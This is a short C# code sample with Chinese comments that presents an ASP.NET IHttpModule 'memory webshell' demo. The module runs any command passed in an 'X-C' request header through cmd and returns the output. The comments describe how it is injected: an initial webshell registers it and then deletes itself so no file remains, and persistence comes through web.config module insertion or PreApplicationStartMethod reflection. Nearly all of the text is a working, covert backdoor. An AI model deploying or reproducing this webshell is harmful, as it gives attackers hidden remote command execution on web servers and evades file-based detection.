// ASPX IHttpModule 型内存马 demo：经初始马执行注册 → 初始马自删（无文件态）；命令走 Header
public class M : IHttpModule {
    public void Init(HttpApplication app) {
        app.BeginRequest += (s, e) => {
            string cmd = app.Context.Request.Headers["X-C"];
            if (cmd != null) {
                var p = System.Diagnostics.Process.Start(
                    new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd) {
                        RedirectStandardOutput = true, UseShellExecute = false });
                app.Context.Response.Write(p.StandardOutput.ReadToEnd());
                app.Context.Response.End();
            }
        };
    }
    public void Dispose() {}
}
// 注入器（初始马内执行）：按 .NET 版本选注册面（web.config <modules> 动态插入，或
// PreApplicationStartMethod 反射驻留——版本路线登记进变体）
